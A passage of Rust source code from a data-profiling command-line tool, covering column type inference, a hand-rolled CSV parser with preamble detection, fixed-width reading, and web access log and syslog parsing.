        return ("UUID".to_string(), "matches UUID format".to_string());
    }
    // Checked ahead of parse_prefixed_int further down: a ULID beginning
    // "0X..." (a real, valid Crockford digit sequence) would otherwise get
    // intercepted by the "0x" hex-literal prefix check first, since that
    // needs only a 2-character match versus this check's full 26.
    if values.iter().all(|v| is_ulid(v)) {
        return (
            "ULID".to_string(),
            "matches ULID format (Crockford base32, valid timestamp bits)".to_string(),
        );
    }
    if values.iter().all(|v| is_email(v)) {
        return (
            "Email".to_string(),
            "matches email address format".to_string(),
        );
    }
    if values.iter().all(|v| is_ipv4(v)) {
        return (
            "IPv4".to_string(),
            "matches IPv4 address format".to_string(),
        );
    }
    if values.iter().all(|v| is_ipv6(v)) {
        return (
            "IPv6".to_string(),
            "matches IPv6 address format".to_string(),
        );
    }
    if values.iter().all(|v| is_cidr(v)) {
        return (
            "CIDR".to_string(),
            "matches CIDR notation (address/prefix-length, valid range)".to_string(),
        );
    }
    if values.iter().all(|v| is_semver(v)) {
        return (
            "SemVer".to_string(),
            "matches MAJOR.MINOR.PATCH semver.org format".to_string(),
        );
    }
    if values.iter().all(|v| is_url(v)) {
        return ("URL".to_string(), "matches URL format".to_string());
    }

    if values.iter().all(|v| parse_prefixed_int(v).is_some()) {
        return (
            "i64".to_string(),
            "base-prefixed literal (0x/0b/0o), decoded from its declared base".to_string(),
        );
    }

    if values.iter().all(|v| is_jwt(v)) {
        return (
            "JWT".to_string(),
            "matches JSON Web Token format (header/payload decode as JSON objects)".to_string(),
        );
    }

    if values.iter().all(|v| is_embedded_json(v)) {
        return (
            "String".to_string(),
            "cell holds embedded JSON (object/array) - consider parsing it separately".to_string(),
        );
    }

    // Checked well ahead of the weaker lat/lon check below - the OGC
    // keyword makes this a much stronger, more specific signal, the same
    // "more specific match wins" principle as everywhere else in this file.
    if values.iter().all(|v| is_wkt_geometry(v)) {
        return (
            "WKT Geometry".to_string(),
            "matches Well-Known Text geometry format".to_string(),
        );
    }

    // Checked last among the "precise grammar" checks, deliberately: unlike
    // everything above it, this has no checksum or fixed prefix to rule out
    // coincidence - see is_lat_lon_pair's own doc comment.
    if values.iter().all(|v| is_lat_lon_pair(v)) {
        return (
            "Geographic Coordinates".to_string(),
            "matches \"lat,lon\" within valid ranges (±90/±180)".to_string(),
        );
    }

    // Same tier as is_lat_lon_pair, same reason: no checksum or prefix, so
    // this carries the same kind of disclosed, irreducible ambiguity - see
    // is_cron_expression's own doc comment.
    if values.iter().all(|v| is_cron_expression(v)) {
        return (
            "Cron Expression".to_string(),
            "matches 5-field cron format (minute hour day-of-month month day-of-week)".to_string(),
        );
    }

    // Note-only, never a type change: see hash_digest_kind's doc comment
    // for why this is deliberately the weakest-confidence check here.
    if let Some(kind) = values.first().and_then(|first| hash_digest_kind(first))
        && values.iter().all(|v| hash_digest_kind(v) == Some(kind))
    {
        return (
            "String".to_string(),
            format!(
                "matches {kind} hex-digest length ({} hex chars) - shape only, not a validated hash",
                values[0].len()
            ),
        );
    }

    // Date/time formats are checked before the leading-zero heuristic below:
    // a value like "01/15/2024" or "09:00:00" has a leading zero on its
    // month/hour, but it's a structured date/time, not a numeric ID that
    // lost a zero - the more specific, fully-explaining match should win.
    if let Some(fmt) = matching_date_format(values) {
        return (
            "NaiveDate / DateTime".to_string(),
            format!("all values match date format \"{fmt}\""),
        );
    }

    if let Some(fmt) = matching_time_format(values) {
        return (
            "NaiveTime".to_string(),
            format!("all values match time format \"{fmt}\""),
        );
    }

    if values.iter().any(|v| has_leading_zero(v)) {
        let mut note = "leading zeros in raw values (likely an ID/code)".to_string();
        if current == "i64" || current == "f64" {
            note.push_str(" - a naive numeric parse already lost them");
        }
        return ("String".to_string(), note);
    }

    if values.iter().all(|v| is_bool_word(v)) {
        return (
            "bool".to_string(),
            "values are yes/no/true/false/on/off".to_string(),
        );
    }

    let normalized: Vec<(String, bool)> = values.iter().map(|v| normalize_numeric_str(v)).collect();
    let any_percent = normalized.iter().any(|(_, pct)| *pct);
    let cleaned_refs: Vec<&str> = normalized.iter().map(|(s, _)| s.as_str()).collect();

    if cleaned_refs.iter().all(|v| v.parse::<i64>().is_ok()) {
        return ("i64".to_string(), numeric_note(current, "i64", any_percent));
    }
    if cleaned_refs.iter().all(|v| v.parse::<f64>().is_ok()) {
        let mut note = numeric_note(current, "f64", any_percent);
        // Rust's f64 parser accepts "inf"/"infinity"/"nan" (any case, signed)
        // as legitimate values - real IEEE-754 special values, not a parse
        // error - so a stray "Infinity" typed into an otherwise-clean numeric
        // column sails through silently unless flagged explicitly here.
        if cleaned_refs
            .iter()
            .any(|v| v.parse::<f64>().is_ok_and(|f| !f.is_finite()))
        {
            let extra = "contains a non-finite value (Infinity/NaN) - verify this isn't a data-quality sentinel before trusting downstream arithmetic";
            note = if note.is_empty() {
                extra.to_string()
            } else {
                format!("{note}; {extra}")
            };
        }
        // A value that's itself a plain integer literal but individually
        // failed i64 parsing (as opposed to merely being outvoted by some
        // other, differently-shaped value in the same column, like the
        // "infinity" case just above) is, by construction, already too
        // large to represent exactly as f64 either - see
        // is_plain_integer_literal's doc comment.
        if cleaned_refs
            .iter()
            .any(|v| is_plain_integer_literal(v) && v.parse::<i64>().is_err())
        {
            let extra = "value(s) exceed i64's range and f64's exact-integer range (~2^53) - representing as float silently loses precision";
            note = if note.is_empty() {
                extra.to_string()
            } else {
                format!("{note}; {extra}")
            };
        }
        return ("f64".to_string(), note);
    }

    let unique: HashSet<&str> = values.iter().copied().collect();
    // A single unique value is a degenerate case the ratio check below can
    // never catch on a small file (10 rows / 1 unique value = 10%
    // cardinality, already past the 5% bar) - constant is constant
    // regardless of row count, so it's checked unconditionally first.
    if unique.len() == 1 {
        return (
            "enum / category".to_string(),
            "constant column (1 unique value)".to_string(),
        );
    }
    let ratio = unique.len() as f64 / values.len() as f64;
    if unique.len() <= 50 && ratio < 0.05 {
        return (
            "enum / category".to_string(),
            format!("low cardinality ({} unique values)", unique.len()),
        );
    }

    ("String".to_string(), String::new())
}

fn escape_md(s: &str) -> String {
    s.replace('|', "\\|").replace('\n', " ")
}

/// Round to 1 decimal place so JSON output shows 66.7, not 66.66666666666667.
fn round1(x: f64) -> f64 {
    (x * 10.0).round() / 10.0
}

// --- CSV / TSV reader ---

fn naive_current_type(values: &[&str]) -> &'static str {
    if values
        .iter()
        .all(|v| v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("false"))
    {
        "bool"
    } else if values.iter().all(|v| v.parse::<i64>().is_ok()) {
        "i64"
    } else if values.iter().all(|v| v.parse::<f64>().is_ok()) {
        "f64"
    } else {
        "String"
    }
}

/// A minimal hand-rolled stand-in for the `csv` crate (see CLAUDE.md's
/// Dependency footprint section), replicating its actual documented
/// default behavior exactly rather than a naive delimiter-split - each
/// point below confirmed directly against `csv-core`'s own reader.rs
/// state machine (`transition_nfa`) before being relied on, the same
/// "verify against the source, don't assume" discipline this project
/// already applies to `sniff_format`'s magic-byte checks elsewhere:
///   - CRLF, bare LF, and bare CR are each independently a record
///     terminator, and any *run* of them (including a genuinely blank
///     line) is fully skipped rather than producing an empty record.
///   - A field starting with `"` is quoted: the delimiter or a line
///     ending inside it is just data, and `""` is an escaped literal
///     `"`. Quoting is only special at the very start of a field - a
///     `"` appearing mid-*unquoted*-field is copied literally.
///   - Content immediately following a quoted field's closing quote,
///     before the next delimiter/terminator, is appended to the same
///     field rather than erroring (`csv-core`'s own permissive
///     `InDoubleEscapedQuote` -> `InField` transition).
///   - A leading UTF-8 BOM is stripped, but only at the very start of
///     the file, not anywhere else a BOM codepoint might appear.
///
/// Operates on `char`s (not raw bytes) so multi-byte UTF-8 content is
/// never split mid-character - the delimiter itself is always ASCII in
/// practice (the CLI's own `--delimiter` flag already only accepts a
/// single `char`, cast down to `u8` before reaching here, matching what
/// the `csv` crate's own `u8`-typed `.delimiter()` builder method already
/// required).
fn parse_csv(content: &str, delimiter: u8) -> Vec<Vec<String>> {
    let content = content.strip_prefix('\u{FEFF}').unwrap_or(content);
    let delimiter = delimiter as char;

    #[derive(Clone, Copy, PartialEq)]
    enum State {
        StartRecord,
        StartField,
        InField,
        InQuotedField,
        InDoubleEscapedQuote,
    }

    fn is_term(c: char) -> bool {
        c == '\r' || c == '\n'
    }

    let chars: Vec<char> = content.chars().collect();
    let mut records: Vec<Vec<String>> = Vec::new();
    let mut record: Vec<String> = Vec::new();
    let mut field = String::new();
    let mut state = State::StartRecord;

    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match state {
            State::StartRecord => {
                if is_term(c) {
                    i += 1;
                } else {
                    state = State::StartField;
                }
            }
            State::StartField => {
                if c == '"' {
                    state = State::InQuotedField;
                    i += 1;
                } else if c == delimiter {
                    record.push(std::mem::take(&mut field));
                    i += 1;
                } else if is_term(c) {
                    record.push(std::mem::take(&mut field));
                    records.push(std::mem::take(&mut record));
                    state = State::StartRecord;
                    i += 1;
                } else {
                    field.push(c);
                    state = State::InField;
                    i += 1;
                }
            }
            State::InField => {
                if c == delimiter {
                    record.push(std::mem::take(&mut field));
                    state = State::StartField;
                    i += 1;
                } else if is_term(c) {
                    record.push(std::mem::take(&mut field));
                    records.push(std::mem::take(&mut record));
                    state = State::StartRecord;
                    i += 1;
                } else {
                    field.push(c);
                    i += 1;
                }
            }
            State::InQuotedField => {
                if c == '"' {
                    state = State::InDoubleEscapedQuote;
                } else {
                    field.push(c);
                }
                i += 1;
            }
            State::InDoubleEscapedQuote => {
                if c == '"' {
                    field.push('"');
                    state = State::InQuotedField;
                    i += 1;
                } else if c == delimiter {
                    record.push(std::mem::take(&mut field));
                    state = State::StartField;
                    i += 1;
                } else if is_term(c) {
                    record.push(std::mem::take(&mut field));
                    records.push(std::mem::take(&mut record));
                    state = State::StartRecord;
                    i += 1;
                } else {
                    field.push(c);
                    state = State::InField;
                    i += 1;
                }
            }
        }
    }
    // Flush a final, unterminated record (no trailing newline) - anything
    // other than a pristine StartRecord means real content is pending.
    if state != State::StartRecord {
        record.push(field);
        records.push(record);
    }

    records
}

fn columns_from_csv(
    path: &Path,
    nrows: Option<usize>,
    delimiter: u8,
    skip_rows: usize,
) -> Result<Vec<ColumnInput>> {
    let content = fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
    let records = parse_csv(&content, delimiter);

    // If the file has fewer than skip_rows+1 rows, there's no header to
    // read at all - headers stays empty and the loop below produces zero
    // columns, the same silent-empty-result behavior this function has
    // always had for that case (never an error - skip_rows past the end
    // of a short file isn't itself a malformed-input signal).
    let headers: Vec<String> = records.get(skip_rows).cloned().unwrap_or_default();
    let data_rows: &[Vec<String>] = records.get(skip_rows + 1..).unwrap_or(&[]);

    let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
    for (i, record) in data_rows.iter().enumerate() {
        if nrows.is_some_and(|limit| i >= limit) {
            break;
        }
        if record.len() != headers.len() {
            bail!(
                "CSV error: found record with {} fields, but the header has {} fields",
                record.len(),
                headers.len()
            );
        }
        for (col_idx, field) in record.iter().enumerate() {
            let trimmed = field.trim();
            let value = if trimmed.is_empty() || is_missing_sentinel(trimmed) {
                None
            } else {
                Some(field.clone())
            };
            raw[col_idx].push(value);
        }
    }

    let mut columns = Vec::new();
    for (col_idx, name) in headers.into_iter().enumerate() {
        let total = raw[col_idx].len();
        let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
        let current_type = if non_null.is_empty() {
            "String".to_string()
        } else {
            let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
            naive_current_type(&refs).to_string()
        };
        columns.push(ColumnInput {
            name,
            current_type,
            raw_values: non_null,
            total,
            skip_heuristics: false,
        });
    }
    Ok(columns)
}

// A leading row above the real header is a real, observed pattern with (at
// least) two distinct real-world shapes, both found via real-world testing
// rather than reasoned about in advance, and both handled by independent
// signals below - either firing leaves skip_rows at that row count, never
// guessing on cell content or column-name meaning, the same bar every
// other heuristic in this file holds to:
//
//   1. A title/instructions banner row (Ask A Manager's public salary
//      survey, and independently the HPI Pollock benchmark's own
//      file_preamble.csv fixture, both showing the same shape): padded
//      with trailing commas to the same field count as the real header,
//      but almost entirely empty. Signal A below: a leading row counts as
//      a candidate only if it has at least two fields and at most one of
//      them is non-empty (requiring >= 2 fields specifically rules out
//      misreading a genuine single-column dataset, whose every row is
//      trivially "1 of 1 fields populated"), and the run of such rows
//      must be immediately followed by a row where *every* field is
//      non-empty - the strongest available signal that row is the real
//      header, not just another sparse one.
//   2. A metadata/row-count line (found in three real files in the HPI
//      Pollock benchmark's own crawled-CSV survey: "868\n0,0.0\n0.0025,
//      ...\n..." - "868" is a row count for a scientific/numeric export,
//      not a header). Signal A can't catch this - the line is a real,
//      non-empty value, not padding. Signal B below instead trusts a
//      field-count mismatch between the leading row and a *stable* run of
//      what immediately follows (every one of the next several rows
//      sharing one consistent field count, not just the very next row, so
//      a single coincidentally-matching neighbor in an otherwise-ragged
//      file can't trigger it).
//
// Both signals are capped at MAX_PREAMBLE_SCAN so a genuinely sparse or
// oddly-shaped dataset can never have an unbounded chunk silently skipped.
const MAX_PREAMBLE_SCAN: usize = 5;

fn detect_preamble_rows(path: &Path, delimiter: u8) -> usize {
    let Ok(content) = fs::read_to_string(path) else {
        return 0;
    };
    let records: Vec<Vec<String>> = parse_csv(&content, delimiter)
        .into_iter()
        .take(MAX_PREAMBLE_SCAN + 1)
        .collect();

    fn fill(record: &[String]) -> (usize, usize) {
        let total = record.len();
        let non_empty = record.iter().filter(|f| !f.trim().is_empty()).count();
        (non_empty, total)
    }

    let mut skip = 0;
    while skip < records.len().saturating_sub(1) && skip < MAX_PREAMBLE_SCAN {
        let (non_empty, total) = fill(&records[skip]);
        if total >= 2 && non_empty <= 1 {
            skip += 1;
        } else {
            break;
        }
    }
    if skip > 0 && skip < records.len() {
        let (non_empty, total) = fill(&records[skip]);
        if total >= 2 && non_empty == total {
            return skip;
        }
    }

    // Second, independent signal - found via real-world testing (three
    // files in the HPI Pollock benchmark's own crawled-CSV survey), not
    // reasoned about in advance: a single metadata/row-count line ahead of
    // otherwise-uniform tabular data (a real, common shape scientific/
    // numeric export tools produce, e.g. "868\n0,0.0\n0.0025,...\n..." -
    // "868" is a row count, not a header). Signal A above can't catch
    // this: the leading row here is non-empty (it's a real value, not
    // padding), so it never even qualifies as a candidate. What's
    // confident here instead is that its field count doesn't match a
    // *stable* run of what immediately follows - stable meaning every one
    // of the next several rows shares one consistent field count, not
    // just the very next row, so one coincidentally-matching neighbor in
    // an otherwise-ragged file can't trigger this. Requires at least 3
    // corroborating body rows (records.len() >= 4) before trusting it -
    // weaker corroboration than that isn't worth acting on.
    if records.len() >= 4 {
        let (_, leading_total) = fill(&records[0]);
        let (_, body_total) = fill(&records[1]);
        let body_is_stable = records[1..].iter().all(|r| fill(r).1 == body_total);
        if body_total >= 2 && leading_total != body_total && body_is_stable {
            return 1;
        }
    }

    0
}

/// Explicit --skip-rows always wins; otherwise falls back to
/// detect_preamble_rows and, if it fires, discloses what happened to
/// stderr rather than silently changing the output - the same "never
/// hidden" treatment every other auto-behavior in this file gets.
fn resolve_skip_rows(explicit: Option<usize>, path: &Path, delimiter: u8) -> usize {
    match explicit {
        Some(n) => n,
        None => {
            let detected = detect_preamble_rows(path, delimiter);
            if detected > 0 {
                eprintln!(
                    "detected {detected} preamble row(s) before the header - skipping (pass --skip-rows to override)"
                );
            }
            detected
        }
    }
}

// --- Fixed-width text reader (only reachable via --format fixed-width,
// since there's no reliable extension convention to infer it from) ---
// There's no delimiter to split fields on, so column boundaries must be
// given explicitly via --widths rather than guessed - a fuzzy "infer the
// boundaries from whitespace alignment" heuristic could easily misparse a
// column whose values happen to align by chance, which is exactly the kind
// of guess this tool's design philosophy avoids (see CLAUDE.md). The first
// line is still assumed to be a header row, same as CSV/TSV/Excel.

/// Slices one line into `widths.len()` fields by character count (not byte
/// count, so multi-byte UTF-8 doesn't split a field mid-character), padding
/// with empty fields if the line is shorter than the declared widths.
fn slice_fixed_width(line: &str, widths: &[usize]) -> Vec<String> {
    let chars: Vec<char> = line.chars().collect();
    let mut pos = 0;
    let mut fields = Vec::with_capacity(widths.len());
    for &w in widths {
        let end = (pos + w).min(chars.len());
        let field: String = if pos < chars.len() {
            chars[pos..end].iter().collect()
        } else {
            String::new()
        };
        fields.push(field.trim().to_string());
        pos += w;
    }
    fields
}

fn columns_from_fixed_width(
    path: &Path,
    nrows: Option<usize>,
    widths: &[usize],
) -> Result<Vec<ColumnInput>> {
    let content = fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
    let mut lines = content.lines();
    let header_line = lines.next().ok_or_else(|| anyhow!("{path:?} is empty"))?;
    let headers = slice_fixed_width(header_line, widths);

    let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); widths.len()];
    let mut i = 0;
    for line in lines {
        if line.trim().is_empty() {
            continue; // e.g. a trailing blank line at EOF
        }
        if nrows.is_some_and(|limit| i >= limit) {
            break;
        }
        for (col_idx, field) in slice_fixed_width(line, widths).into_iter().enumerate() {
            let missing = field.is_empty() || is_missing_sentinel(&field);
            raw[col_idx].push(if missing { None } else { Some(field) });
        }
        i += 1;
    }

    let mut columns = Vec::new();
    for (col_idx, name) in headers.into_iter().enumerate() {
        let total = raw[col_idx].len();
        let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
        let current_type = if non_null.is_empty() {
            "String".to_string()
        } else {
            let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
            naive_current_type(&refs).to_string()
        };
        columns.push(ColumnInput {
            name,
            current_type,
            raw_values: non_null,
            total,
            skip_heuristics: false,
        });
    }
    Ok(columns)
}

// --- Web server access log readers (opt-in via --features weblog) ---
// Common Log Format and its Combined extension are fixed, well-known text
// grammars - like fixed-width text, there's no reliable extension to infer
// this from (access logs are commonly .log/.txt/extensionless), so both are
// --format-only, never auto-detected. "-" is each format's own documented
// placeholder for "field not present" (not a guess this tool is making),
// so it's treated as a missing value rather than a literal string. The
// quoted request ("METHOD path PROTOCOL") is split into its own
// method/path/protocol columns instead of kept as one opaque field; a line
// whose request doesn't cleanly split into three tokens just gets missing
// values there rather than a guessed split.

#[cfg(feature = "weblog")]
mod weblog_support {
    use super::*;

    /// Reads a `\S+` token (one or more non-whitespace characters) starting
    /// at byte offset `pos`. `char::is_whitespace` matches the Unicode
    /// `White_Space` property, the same class the `regex` crate's default
    /// (Unicode-mode) `\s`/`\S` use - `str::find` with a `char` predicate
    /// always returns a valid UTF-8 char boundary, so this stays safe on
    /// multi-byte content (a non-ASCII referer/user-agent value) without
    /// needing a byte-level safety precondition the way `is_iban`'s
    /// ASCII-only slicing does.
    fn read_token(line: &str, pos: usize) -> Option<(&str, usize)> {
        let rest = &line[pos..];
        let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
        if end == 0 {
            None
        } else {
            Some((&rest[..end], pos + end))
        }
    }

    fn expect_char(line: &str, pos: usize, c: char) -> Option<usize> {
        if line[pos..].starts_with(c) {
            Some(pos + c.len_utf8())
        } else {
            None
        }
    }

    /// `\d{3}|-`: exactly three ASCII digits, or a literal dash. A status
    /// code with a *fourth* trailing digit isn't silently truncated to
    /// three - `\d{3}` only ever consumes exactly three characters here,
    /// so a fourth digit is left for the caller's next `expect_char(' ')`
    /// to reject, the same way the original regex's own greedy-but-capped
    /// `{3}` repetition would fail there instead of backtracking (there's
    /// nothing shorter than 3 to backtrack to).
    fn read_status_or_dash(line: &str, pos: usize) -> Option<(&str, usize)> {
        if line[pos..].starts_with('-') {
            return Some((&line[pos..pos + 1], pos + 1));
        }
        let bytes = line.as_bytes();
        if pos + 3 <= bytes.len() && bytes[pos..pos + 3].iter().all(u8::is_ascii_digit) {
            Some((&line[pos..pos + 3], pos + 3))
        } else {
            None
        }
    }

    /// `\d+|-`: one or more ASCII digits (greedy - no cap), or a literal
    /// dash.
    fn read_digits_or_dash(line: &str, pos: usize) -> Option<(&str, usize)> {
        if line[pos..].starts_with('-') {
            return Some((&line[pos..pos + 1], pos + 1));
        }
        let bytes = line.as_bytes();
        let mut end = pos;
        while end < bytes.len() && bytes[end].is_ascii_digit() {
            end += 1;
        }
        if end == pos {
            None
        } else {
            Some((&line[pos..end], end))
        }
    }

    /// Hand-rolled replacement for the fixed Common/Combined Log Format
    /// grammar (see CLAUDE.md's Dependency footprint section) - a plain
    /// left-to-right scan needs no backtracking here since every field is
    /// unambiguously delimited (a literal space, bracket, or quote) with
    /// no two alternatives that could both match the same input
    /// differently. Returns the same numbered fields the old regex's
    /// `caps[1]`..`caps[9]` captured, in order, so `columns_from_weblog`
    /// stays structurally unchanged below. `None` means the line doesn't
    /// match the grammar at all - the same outcome `Regex::captures`
    /// returning `None` already produced.
    fn parse_line(line: &str, combined: bool) -> Option<Vec<&str>> {
        let (host, pos) = read_token(line, 0)?;
        let pos = expect_char(line, pos, ' ')?;
        let (ident, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (authuser, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let pos = expect_char(line, pos, '[')?;
        let bracket_len = line[pos..].find(']')?;
        let timestamp = &line[pos..pos + bracket_len];
        let pos = expect_char(line, pos + bracket_len, ']')?;
        let pos = expect_char(line, pos, ' ')?;
        let pos = expect_char(line, pos, '"')?;
        let quote_len = line[pos..].find('"')?;
        let request = &line[pos..pos + quote_len];
        let pos = expect_char(line, pos + quote_len, '"')?;
        let pos = expect_char(line, pos, ' ')?;
        let (status, pos) = read_status_or_dash(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (bytes, mut pos) = read_digits_or_dash(line, pos)?;

        let mut groups = vec![host, ident, authuser, timestamp, request, status, bytes];

        if combined {
            pos = expect_char(line, pos, ' ')?;
            pos = expect_char(line, pos, '"')?;
            let quote_len = line[pos..].find('"')?;
            let referer = &line[pos..pos + quote_len];
            pos = expect_char(line, pos + quote_len, '"')?;
            pos = expect_char(line, pos, ' ')?;
            pos = expect_char(line, pos, '"')?;
            let quote_len = line[pos..].find('"')?;
            let user_agent = &line[pos..pos + quote_len];
            pos = expect_char(line, pos + quote_len, '"')?;
            groups.push(referer);
            groups.push(user_agent);
        }

        // The original regex ends with `$` - the whole line must be
        // consumed, not just a leading prefix of it.
        if pos == line.len() {
            Some(groups)
        } else {
            None
        }
    }

    /// Hand-rolled replacement for `^(\S+) (\S+) (\S+)$` - exactly three
    /// whitespace-delimited tokens spanning the entire string.
    fn parse_request_line(s: &str) -> Option<(&str, &str, &str)> {
        let (method, pos) = read_token(s, 0)?;
        let pos = expect_char(s, pos, ' ')?;
        let (path, pos) = read_token(s, pos)?;
        let pos = expect_char(s, pos, ' ')?;
        let (protocol, pos) = read_token(s, pos)?;
        if pos == s.len() {
            Some((method, path, protocol))
        } else {
            None
        }
    }

    fn dash_to_none(s: &str) -> Option<String> {
        if s == "-" { None } else { Some(s.to_string()) }
    }

    pub(crate) fn columns_from_weblog(
        path: &Path,
        nrows: Option<usize>,
        combined: bool,
    ) -> Result<Vec<ColumnInput>> {
        let content =
            fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;

        let mut names: Vec<&str> = vec![
            "host",
            "ident",
            "authuser",
            "timestamp",
            "method",
            "path",
            "protocol",
            "status",
            "bytes",
        ];
        if combined {
            names.extend(["referer", "user_agent"]);
        }

        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
        let mut total = 0usize;
        for (line_no, line) in content.lines().enumerate() {
            if line.trim().is_empty() {
                continue;
            }
            if nrows.is_some_and(|limit| total >= limit) {
                break;
            }
            let format_name = if combined {
                "Combined Log"
            } else {
                "Common Log"
            };
            let caps = parse_line(line, combined).ok_or_else(|| {
                anyhow!(
                    "line {} doesn't match {format_name} Format: {line:?}",
                    line_no + 1
                )
            })?;

            let (method, req_path, protocol) = match parse_request_line(caps[4]) {
                Some((m, p, pr)) => (
                    Some(m.to_string()),
                    Some(p.to_string()),
                    Some(pr.to_string()),
                ),
                None => (None, None, None),
            };
            let mut values = vec![
                dash_to_none(caps[0]),
                dash_to_none(caps[1]),
                dash_to_none(caps[2]),
                Some(caps[3].to_string()),
                method,
                req_path,
                protocol,
                dash_to_none(caps[5]),
                dash_to_none(caps[6]),
            ];
            if combined {
                values.push(dash_to_none(caps[7]));
                values.push(dash_to_none(caps[8]));
            }
            for (col_idx, value) in values.into_iter().enumerate() {
                raw[col_idx].push(value);
            }
            total += 1;
        }

        let mut columns = Vec::new();
        for (col_idx, name) in names.into_iter().enumerate() {
            let non_null: Vec<String> = raw[col_idx].iter().filter_map(|v| v.clone()).collect();
            let current_type = if non_null.is_empty() {
                "String".to_string()
            } else {
                let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                naive_current_type(&refs).to_string()
            };
            columns.push(ColumnInput {
                name: name.to_string(),
                current_type,
                raw_values: non_null,
                total,
                skip_heuristics: false,
            });
        }
        Ok(columns)
    }
} // mod weblog_support

#[cfg(feature = "weblog")]
fn columns_from_weblog(
    path: &Path,
    nrows: Option<usize>,
    combined: bool,
) -> Result<Vec<ColumnInput>> {
    weblog_support::columns_from_weblog(path, nrows, combined)
}

#[cfg(not(feature = "weblog"))]
fn columns_from_weblog(
    _path: &Path,
    _nrows: Option<usize>,
    _combined: bool,
) -> Result<Vec<ColumnInput>> {
    bail!(
        "web server log support isn't compiled in - rebuild with `cargo build --release --features weblog` (or --features full)"
    )
}

// --- Syslog readers (opt-in via --features syslog) ---
// RFC 3164 (the classic BSD format, still what most syslog daemons emit by
// default) and RFC 5424 (the newer structured format) are, like the web
// access log formats above, fixed text grammars with no reliable extension
// to infer from - --format-only, never auto-detected. PRI decodes
// deterministically into facility/severity per the RFC's own numeric
// tables (not a guess), and RFC 5424's "-" nilvalue is the format's own
// documented placeholder for "field not specified", so it becomes a
// missing value the same way it does for the web access logs. RFC 3164's
// timestamp famously has no year field at all - a real limitation of the
// format itself, not something this tool can paper over - so it's left as
// a plain string rather than forced through the date-matching heuristic.

#[cfg(feature = "syslog")]
const SYSLOG_FACILITIES: [&str; 24] = [
    "kernel",
    "user",
    "mail",
    "daemon",
    "auth",
    "syslog",
    "lpr",
    "news",
    "uucp",
    "cron",
    "authpriv",
    "ftp",
    "ntp",
    "security",
    "console",
    "solaris-cron",
    "local0",
    "local1",
    "local2",
    "local3",
    "local4",
    "local5",
    "local6",
    "local7",
];

#[cfg(feature = "syslog")]
const SYSLOG_SEVERITIES: [&str; 8] = [
    "emergency",
    "alert",
    "critical",
    "error",
    "warning",
    "notice",
    "informational",
    "debug",
];

#[cfg(feature = "syslog")]
fn syslog_facility_name(pri: u32) -> String {
    SYSLOG_FACILITIES
        .get((pri / 8) as usize)
        .map_or_else(|| (pri / 8).to_string(), |s| (*s).to_string())
}

#[cfg(feature = "syslog")]
fn syslog_severity_name(pri: u32) -> String {
    SYSLOG_SEVERITIES
        .get((pri % 8) as usize)
        .map_or_else(|| (pri % 8).to_string(), |s| (*s).to_string())
}

#[cfg(feature = "syslog")]
mod syslog_support {
    use super::*;

    fn expect_char(line: &str, pos: usize, c: char) -> Option<usize> {
        if line[pos..].starts_with(c) {
            Some(pos + c.len_utf8())
        } else {
            None
        }
    }

    fn read_token(line: &str, pos: usize) -> Option<(&str, usize)> {
        let rest = &line[pos..];
        let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
        if end == 0 {
            None
        } else {
            Some((&rest[..end], pos + end))
        }
    }

    /// One or more ASCII digits (`\d+`), no cap.
    fn read_digits(line: &str, pos: usize) -> Option<(&str, usize)> {
        let bytes = line.as_bytes();
        let mut end = pos;
        while end < bytes.len() && bytes[end].is_ascii_digit() {
            end += 1;
        }
        if end == pos {
            None
        } else {
            Some((&line[pos..end], end))
        }
    }

    /// `\d{1,max}`: one to `max` ASCII digits, greedy. Mirrors the regex's
    /// own repetition cap directly rather than reading an unbounded run
    /// and hoping the caller's next literal happens to reject any excess -
    /// `<(\d{1,3})>` genuinely cannot consume a 4th digit as part of the
    /// group at all (unlike `\d{3}` immediately followed by a literal,
    /// where "read exactly 3, let the next check reject a 4th" already
    /// works - see the weblog module's `read_status_or_dash`), it isn't
    /// merely a defensive redundancy.
    fn read_digits_capped(line: &str, pos: usize, max: usize) -> Option<(&str, usize)> {
        let bytes = line.as_bytes();
        let mut end = pos;
        while end < bytes.len() && end - pos < max && bytes[end].is_ascii_digit() {
            end += 1;
        }
        if end == pos {
            None
        } else {
            Some((&line[pos..end], end))
        }
    }

    fn dash_to_none(s: &str) -> Option<String> {
        if s == "-" { None } else { Some(s.to_string()) }
    }

    /// Hand-rolled replacement for RFC 5424's fixed grammar:
    /// `^<(\d{1,3})>(\d+) (\S+) (\S+) (\S+) (\S+) (\S+) (-|\[[^\]]*\]) ?(.*)$`
    /// No ambiguity to resolve here (every field is either a fixed literal,
    /// a whitespace-delimited token, or an unambiguous dash-vs-bracket
    /// choice), so - like the Common/Combined Log parser above - a single
    /// forward scan replicates the regex exactly with no backtracking
    /// needed. Returns the same numbered fields `caps[1]`..`caps[9]`
    /// captured, in order.
    fn parse_rfc5424_line(line: &str) -> Option<Vec<&str>> {
        let pos = expect_char(line, 0, '<')?;
        let (pri, pos) = read_digits_capped(line, pos, 3)?;
        let pos = expect_char(line, pos, '>')?;
        let (version, pos) = read_digits(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (timestamp, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (hostname, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (app_name, pos) = read_token(line, pos)?;
        let pos = expect_char(line, pos, ' ')?;
        let (procid, pos) = read_token(line, pos)?;
